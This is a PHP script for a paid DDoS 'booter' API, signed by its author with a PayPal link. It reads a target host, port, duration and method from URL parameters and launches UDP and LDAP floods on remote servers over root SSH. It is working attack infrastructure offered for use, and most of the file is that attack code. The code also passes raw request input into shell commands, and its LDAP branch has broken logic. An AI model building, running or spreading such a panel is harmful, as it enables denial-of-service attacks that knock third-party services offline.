//made by $MartoBossX#7777 dm for help!
https://paypal.me/paytowiner ||

<?php
$servers = array(
    array('vsp ip', array('root', 'vsp password')) //You can add more servers by copying&pasting the command and adding a command on the one above
);
class ssh2
{
   var $connection;
 
   function __construct($host, $user, $pass) {
           if (!$this->connection = ssh2_connect($host, 22))
                   echo "Error connecting to server";
           if (!ssh2_auth_password($this->connection, $user, $pass))
                   echo "Error with login credentials";
   }
 
   function exec($cmd) {
        if (!ssh2_exec($this->connection, $cmd))
                   echo "Error executing command: $cmd";
        
        ssh2_exec($this->connection, 'exit');
        unset($this->connection);
        return true;
   }
}
 
class API
{
   
    private $get;
    public $message = "None";
    private $server;
    public $isL7 = false;
   
 
    public function __construct(array $server)
    {
        $this->server = $server;
        $this->get = (object) $_GET;
    }
   
    public function start()
    {
 
        if($this->validate()) {
            $this->doBoot();
        }
        return $this->message;
    }
   
   
    private function validate()
    {
 
       
        if (!filter_var($this->get->host, FILTER_VALIDATE_IP)) {
                if(!filter_var($this->get->host, FILTER_VALIDATE_URL)) {
                        $this->message = "Invalid IP/URL";
                        return false;            
                }
                $this->isL7 = true;
        }
       
        if (!intval($this->get->port) >= 1) {
            $this->message = "Invalid Port";
            return false;
        }
       
        if (!intval($this->get->time) >= 1) {
            $this->message = "Invalid Time";
            return false;
        }
 
        return true;
 
    }
   
   
    private function doBoot()
    {
        $smIP = escapeshellarg(str_replace(".", "", $this->get->host));
        switch(strtoupper($this->get->method)) {
            case "LDAP":
                $command = "screen -X -S {$smIP} ./ldap {$this->get->host} {$this->get->port} 65000 1 {$time}";
                $this->message = "Attack Stopped";
                break;
            case "STOP":
                $command = "screen -X -S {$smIP} quit";
                $this->message = "Attack Stopped";
                break;
            case "UDP":
                //this is if you want to set a max time for a specific method. also the default method will send when you dont meet the case requirement.
                $time = ($this->get->time);
                if (intval($this->get->time) > 1200) {
                    $time = 1200;
                }
                // example you can change it!
                $command = "screen -dmS {$smIP} perl UDPflood.pl {$this->get->host} {$this->get->port} 65500 {$time}";
                $this->message = 'Attack sent';
                break;
        }
 
        if(!empty($command)) {
 
            $ssh = new ssh2($this->server[0], $this->server[1][0], $this->server[1][1]);
 
            if(!$ssh->exec($command)) {
                $this->message = 'Error executing attack on server.';
            } 
        }
 
        return $this->message;
    }  
}
 
if (!function_exists('ssh2_connect'))
{
    die("Install the php ssh2 module.\n");
}
//Change this key
if ($_GET['key'] != "Key"){
    die("Your Key Is Invalid");
}
$count = 0;
foreach ($servers as $array){
    $attack = new API(array($servers[$count][0], $servers[$count][1]));
    $attack->start();
    echo substr($servers[$count][0], -6) . " | " . $attack->message . " | " . $_GET['method'] ."<br>";
    $count++;
}

